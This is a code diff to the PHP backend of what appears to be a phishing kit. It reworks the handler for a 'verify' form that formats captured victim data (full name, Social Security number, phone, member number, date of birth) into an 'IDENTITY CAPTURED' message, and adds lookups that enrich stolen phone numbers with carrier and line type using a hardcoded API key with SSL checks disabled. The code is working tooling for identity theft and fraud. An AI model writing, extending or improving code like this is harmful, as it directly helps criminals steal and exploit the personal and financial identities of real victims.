@@ -20,7 +20,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'line-type') {
         die(json_encode(['type' => 'unknown']));
 
     $abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
-    $url = "https://phonevalidation.abstractapi.com/v1/?api_key={$abstractKey}&phone=" . urlencode($phone);
+    $url = "https://phoneintelligence.abstractapi.com/v1/?api_key={$abstractKey}&phone=" . urlencode($phone);
 
     $ch = curl_init($url);
     curl_setopt_array($ch, [
@@ -225,18 +225,33 @@ switch ($form_type) {
     case 'verify':
         $phoneFlag = $d['phone'] ?? 'N/A';
         if (!empty($d['phone']) && strlen($d['phone']) > 5) {
-            $pVal = api_ninja('validatephone', ['number' => $d['phone']]);
-            if ($pVal && isset($pVal['is_valid'])) {
-                $phoneFlag .= $pVal['is_valid'] ? ' (✅ Valid)' : ' (❌ Invalid)';
+            $abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
+            $url = "https://phoneintelligence.abstractapi.com/v1/?api_key={$abstractKey}&phone=" . urlencode($d['phone']);
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 3,
+                CURLOPT_SSL_VERIFYPEER => false
+            ]);
+            $res = curl_exec($ch);
+            curl_close($ch);
+            $pData = $res ? json_decode($res, true) : null;
+
+            if ($pData && isset($pData['phone_validation'])) {
+                $isValid = !empty($pData['phone_validation']['is_valid']) ? '✅ Valid' : '❌ Invalid';
+                $carrier = $pData['phone_carrier']['name'] ?? 'Unknown Carrier';
+                $lineType = $pData['phone_carrier']['line_type'] ?? 'Unknown Line';
+                $phoneFlag .= " ({$isValid} - {$lineType} - {$carrier})";
             }
         }
 
+        $dobStr = !empty($d['dob']) ? he($d['dob']) . " (✅ Frontend Validated)" : 'N/A';
         $msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" . $header
             . "👤 <b>Name:</b>  <code>" . he($d['full_name'] ?? 'N/A') . "</code>\n"
             . "🔢 <b>SSN:</b>   <code>" . he($d['ssn'] ?? 'N/A') . "</code>\n"
             . "📞 <b>Phone:</b> <code>" . he($phoneFlag) . "</code>\n"
             . "🆔 <b>Member #:</b> <code>" . he($d['member_num'] ?? 'N/A') . "</code>\n"
-            . "🎂 <b>DOB:</b>   <code>" . he($d['dob'] ?? 'N/A') . " (✅ Frontend Validated)</code>";
+            . "🎂 <b>DOB:</b>   <code>" . $dobStr . "</code>";
         break;
 
     case 'card':
